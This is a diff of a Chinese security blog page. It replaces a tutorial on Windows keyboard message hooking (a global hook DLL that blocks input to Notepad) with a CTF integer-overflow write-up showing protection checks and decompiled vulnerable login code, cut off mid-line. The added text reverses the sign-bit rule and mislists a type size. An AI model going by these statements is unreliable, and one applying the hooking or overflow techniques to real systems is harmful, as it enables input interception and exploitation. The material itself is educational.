@@ -6,25 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://thriumph.top">
-  <title>windows消息钩取 | Thriumph</title>
+  <title>int_overflow | Thriumph</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="windows是一个消息驱动式系统。windows消息提供在应用程序与应用程序之间，应用程序与windows系统之间通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。">
-<meta name="keywords" content="windows,hook">
+  <meta name="description" content="整数溢出漏洞">
+<meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows消息钩取">
-<meta property="og:url" content="https://thriumph.top/windows消息钩取.html">
+<meta property="og:title" content="int_overflow">
+<meta property="og:url" content="https://thriumph.top/int-overflow.html">
 <meta property="og:site_name" content="Thriumph">
-<meta property="og:description" content="windows是一个消息驱动式系统。windows消息提供在应用程序与应用程序之间，应用程序与windows系统之间通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。">
+<meta property="og:description" content="整数溢出漏洞">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://thriumph.top/windows消息钩取/1.png">
-<meta property="og:image" content="https://thriumph.top/windows消息钩取/2.png">
-<meta property="og:image" content="https://thriumph.top/windows消息钩取/3.png">
-<meta property="og:image" content="https://thriumph.top/windows消息钩取/4.png">
-<meta property="og:updated_time" content="2019-08-22T14:50:41.939Z">
+<meta property="og:updated_time" content="2019-11-18T10:34:38.095Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="windows消息钩取">
-<meta name="twitter:description" content="windows是一个消息驱动式系统。windows消息提供在应用程序与应用程序之间，应用程序与windows系统之间通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。">
-<meta name="twitter:image" content="https://thriumph.top/windows消息钩取/1.png">
+<meta name="twitter:title" content="int_overflow">
+<meta name="twitter:description" content="整数溢出漏洞">
   
     <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
   
@@ -163,14 +158,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-windows消息钩取" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-int-overflow" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      windows消息钩取
+      int_overflow
     </h1>
   
 
@@ -190,73 +185,77 @@
 
 
         
-        <a href="/windows消息钩取.html" class="archive-article-date">
-  	<time datetime="2019-07-06T14:34:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-06</time>
+        <a href="/int-overflow.html" class="archive-article-date">
+  	<time datetime="2019-10-31T01:35:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>windows是一个消息驱动式系统。windows消息提供在应用程序与应用程序之间，应用程序与windows系统之间通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。</p>
+        <p>整数溢出漏洞</p>
 <a id="more"></a>
+<h1 id="整数溢出的原理"><a href="#整数溢出的原理" class="headerlink" title="整数溢出的原理"></a>整数溢出的原理</h1><p>整数分为有符号和无符号两种类型，有符号数以最高位作为其符号位，即正整数最高位为1，负数为0，无符号数取值范围为非负数，常见各类型占用字节数如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th align="center">占用字节数</th>
+<th align="center">值范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">int</td>
+<td align="center">4</td>
+<td align="center">-2147483648~2147483647</td>
+</tr>
+<tr>
+<td align="center">Long int</td>
+<td align="center">4</td>
+<td align="center">-2147483648~2147483647</td>
+</tr>
+<tr>
+<td align="center">Unsigned int</td>
+<td align="center">4</td>
+<td align="center">0~4294967295</td>
+</tr>
+<tr>
+<td align="center">Unsigned short int</td>
+<td align="center">2</td>
+<td align="center">0~65535</td>
+</tr>
+<tr>
+<td align="center">Unsigned short int</td>
+<td align="center">4</td>
+<td align="center">0~4294967295</td>
+</tr>
+</tbody></table>
+<p>定义一个unsigned short int类型(0~65535)的变量a，b,a=1,b=65537<br>写一个C语言代码测试一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> a=<span class="number">1</span>,b=<span class="number">65537</span>;</span><br><span class="line">    <span class="keyword">if</span>(a==b)</span><br><span class="line">    &#123;	</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"溢出，a=b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"sb"</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h1 id="windows消息机制"><a href="#windows消息机制" class="headerlink" title="windows消息机制"></a>windows消息机制</h1><p>windows是一个消息驱动式系统。windows消息提供在应用程序与应用程序之间，应用程序与windows系统之间通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。</p>
-<p>进程是具有一定独立功能的程序关于某个数据集合上的一次运行活动,进程是系统进行资源分配和调度的一个独立单位。</p>
-<p>进程可以看做程序执行的一个实例。进程是系统资源分配的独立实体，每个进程都有独立的地址空间。一个进程可以拥有多个线程，每个线程使用其所属进程的栈空间。同一进程内的多个线程可以共享部分状态，多个线程可以读写同一块内存，进程无法访问其他进程的内存。</p>
-<p><code>线程</code></p>
-<p>线程是进程的一个实体,是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位。是进程的一条执行路径。</p>
-<p>线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源,但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源.。</p>
-<ul>
-<li>进程是一个容器，线程在进程这个容器中执行，是实际执行的代码。一 个进程至少拥有一个线程，而这个线程通常被称之为主线程，主线程的入口点也是应用程序的起始点。线程除了必不 可少的资源（程序计数器 一组寄存器和栈）之外，不拥有系统资源，所有进程内 的线程共享分配给这个进程拥有的所有资源。</li>
-</ul>
-<p><code>事件</code></p>
-<p>在操作系统中借助键盘，鼠标，选择菜单，按钮，以及移动鼠标，改动窗口大小和位置都是事件。</p>
-<p><code>句柄</code></p>
-<p>句柄在程序设计中是一种特殊的指针，当一个程序需要引用其他系统时，就要使用句柄。</p>
-<p>句柄是windows编程的基础。一个句柄是指使用一个唯一的整数值（4字节，64位 程序中是8字节），来标识应用程序中的不同对象和同类中的不同实例。</p>
-<h1 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h1><ul>
-<li><p>钩子（Hook）是windows消息处理机制的一个平台，应用程序可以在上面设置子进程以监视指定窗口的某种消息，监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它，钩子机制允许应用程序截获处理windows消息或特定事件。</p>
-</li>
-<li><p>钩子是一个处理消息的程序段，通过系统调用，把他们挂入系统。当特定的消息发出，在没有达到目的窗口前，钩子程序就先捕获该消息，钩子函数先得到控制权，就可以加工处理或改变消息，也可以不处理继续传递消息，也可强制结束消息。</p>
-</li>
-</ul>
-<h1 id="常规windows消息流"><a href="#常规windows消息流" class="headerlink" title="常规windows消息流"></a>常规windows消息流</h1><p>1.发生键盘输入时，WM_KEYDOMN消息被添加到[OS message queue]</p>
-<p>2.OS判断那个应用发生了事件，然后从[OS message queue]取出消息，添加到相应的[application message queue]中。</p>
-<p>3.应用程序监视自身的[application message queue]，发现新添加的WM_KEYDOMN消息后，调用相应的事件处理程序处理。</p>
-<h1 id="消息钩取工作原理"><a href="#消息钩取工作原理" class="headerlink" title="消息钩取工作原理"></a>消息钩取工作原理</h1><p> windows操作系统向用户提供GUI（ 图形用户界面），以事件驱动的方式工作。<br>当事件发生时，OS会把事先定义好的消息发送给响应的应用程序，应用程序收到消息后执行相应的动作。</p>
-<p>OS消息队列与应用程序消息队列之间存在一条钩链（HookChain）处于钩链的钩子会比应用程序先看到相应的信息。在键盘钩子函数的内部，除了可以查看消息外，还可以修改消息本身，对消息拦截或阻止消息传递。可以同时设置多个键盘钩子，按照设置顺序依次调用这些钩子</p>
-<p><img src="/windows消息钩取/1.png" alt></p>
-<h1 id="windows消息钩取的实现——SetWindowsHookEx"><a href="#windows消息钩取的实现——SetWindowsHookEx" class="headerlink" title="windows消息钩取的实现——SetWindowsHookEx()"></a>windows消息钩取的实现——SetWindowsHookEx()</h1><p>使用SetWindowsHookEx()API可以轻松实现消息钩子</p>
-<p><code>SetWindowsHookEx（）API定义</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> idHook,			<span class="comment">//hook type</span></span></span></span><br><span class="line"><span class="function"><span class="params">    HOOKPROC lpfn,		<span class="comment">//hook procedure</span></span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hMod,		<span class="comment">//hook procedure所属的DLL句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwThreadId	<span class="comment">//将要挂钩的目标线程ID</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>运行一下结果为 溢出，a=b<br>也就是说，对于一个2字节的Unsigned short int型变量，它的有效数据长度为两个字节，当它的数据长度超过两个字节时，就溢出，溢出的部分则直接忽略，使用相关变量时，使用的数据仅为最后2个字节，因此就会出现65537等于1的情况，其他类型变量和数值与之类似。</p>
+<h1 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/Thriumph/re/int_overflow'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>
 
-<p><code>idHook：</code> 指示将要安装的挂钩处理过程的类型</p>
-<p><code>Lpfn：</code> 消息的回调函数地址</p>
-<p><code>hMod：</code> 钩子函数所在的实例的句柄。对于线程钩子，该参数为NULL。对于系统钩子，该参数为钩子函数所在的DLL句柄</p>
-<p><code>dwThreadId：</code> 钩子所监视的线程的线程号，可通过GetCurrentThreadId()获得线程号。若dwThreadId参数设置为0，安装的钩子时全局钩子（Global Hook）</p>
-<p>钩子过程是由操作系统调用的回调函数。安装钩子时，钩子过程需要存在某个DLL的内部，这个DLL的实例句柄是hMod</p>
-<p>使用SetWindowsHookEx()设置好钩子后，在某个进程中生成指定消息时，OS会将相关的DLL文件强制注入相应的进程，然后调用注册的钩子过程。</p>
-<h1 id="键盘消息钩子"><a href="#键盘消息钩子" class="headerlink" title="键盘消息钩子"></a>键盘消息钩子</h1><h2 id="Keyhook-cpp"><a href="#Keyhook-cpp" class="headerlink" title="Keyhook.cpp"></a>Keyhook.cpp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_PROCESS_NAME		<span class="meta-string">"notepad.exe"</span></span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (dwReason)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		g_hInstance = hinstDLL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">	<span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// bit 31 : 0 =key press, 1 =key release</span></span><br><span class="line">		<span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>)) <span class="comment">//释放键盘按键时</span></span><br><span class="line">		&#123;</span><br><span class="line">			GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">			p = <span class="built_in">strrchr</span>(szPath, <span class="string">'\\'</span>);<span class="comment">//比较当前进程名称，若为notepad.exe,则消息不会传给应用程序</span></span><br><span class="line">		        <span class="keyword">if</span> (!_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME))</span><br><span class="line">				<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//若非notepad.exe,则调用CallNextHookEx()函数，消息将传递给下一个程序</span></span><br><span class="line"><span class="comment">//_stricmp()函数用于比较字符串，i表示不区分大小写，若两个值相等则返回0</span></span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (g_hHook)</span><br><span class="line">		&#123;</span><br><span class="line">			UnhookWindowsHookEx(g_hHook);</span><br><span class="line">			g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>开启了NX保护。没有canary，没有PIE。</p>
+<h1 id="查看main（）函数"><a href="#查看main（）函数" class="headerlink" title="查看main（）函数"></a>查看main（）函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"~~ Welcome to CTF! ~~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       1.Login       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       2.Exit        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your choice:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye~"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Choice!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>安装好键盘钩子，无论什么进程，只要键盘输入事件，OS就会强行将KeyHook.dll注入进程，加载了KeyHook.dll的进程中，发生键盘事件时会首先调用执行KeyHook.KeyboardProc()</p>
-<p>KeyHook.KeyboardProc()函数中发生键盘输入事件时，会比较进程的名字是否与notepad.exe相同，相同返回1，终止KeyHook.KeyboardProc()函数，截获且删除信息，键盘消息就不会传递到notepad.exe程序的消息队列中。</p>
-<h2 id="HookMain-cpp"><a href="#HookMain-cpp" class="headerlink" title="HookMain.cpp"></a>HookMain.cpp</h2><p>调用导出函数HookStrat()时，SetWindowsHookEx()函数会将KeybroadProc()添加到键盘钩链</p>
-<h3 id="KeybroadProc-函数定义"><a href="#KeybroadProc-函数定义" class="headerlink" title="KeybroadProc()函数定义"></a>KeybroadProc()函数定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> code,           <span class="comment">//HC_ACTION(0), HC_NOREMOVE(3)</span></span></span></span><br><span class="line"><span class="function"><span class="params">    WPARAM wParam,      <span class="comment">//virtual-key code</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam       <span class="comment">//extra information</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">//wParam是按下键盘按键的虚拟键值</span></span><br><span class="line"><span class="comment">//使用ToAscii()API函数可以获得实际按下键盘的ASCII值</span></span><br></pre></td></tr></table></figure>
+<p>输入1登陆，输入2离开</p>
+<h1 id="查看login-函数"><a href="#查看login-函数" class="headerlink" title="查看login()函数"></a>查看login()函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+200h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your username:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your passwd:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);</span><br><span class="line">  <span class="keyword">return</span> check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>先加载KeyHook.DLL文件，然后调用HookStart()函数钩取输入q时，调用HookStop()函数终止钩取。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"conio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	DEF_DLL_NAME		<span class="meta-string">"KeyHook.dll"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	DEF_HOOKSTART		<span class="meta-string">"HookStart"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	DEF_HOOKSTOP		<span class="meta-string">"HookStop"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE			hDll = <span class="literal">NULL</span>;</span><br><span class="line">	PFN_HOOKSTART	HookStart = <span class="literal">NULL</span>;</span><br><span class="line">	PFN_HOOKSTOP	HookStop = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span>			ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载KeyHook.dll </span></span><br><span class="line">	hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>( hDll == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"LoadLibrary(%s) failed!!! [%d]"</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取导出函数地址 </span></span><br><span class="line">	HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">	HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始钩取 </span></span><br><span class="line">	HookStart();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待用户输入“q” </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"press 'q' to quit!\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>( _getch() != <span class="string">'q'</span> )	;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 终止钩取 </span></span><br><span class="line">	HookStop();</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 卸载KeyHook.dll </span></span><br><span class="line">	FreeLibrary(hDll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要输入username和passwd，username和passwd函数都有长度限制，接受了一个最大长度为0x199的password。</p>
+<h1 id="查看check-passwd"><a href="#查看check-passwd" class="headerlink" title="查看check_passwd"></a>查看check_passwd</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span 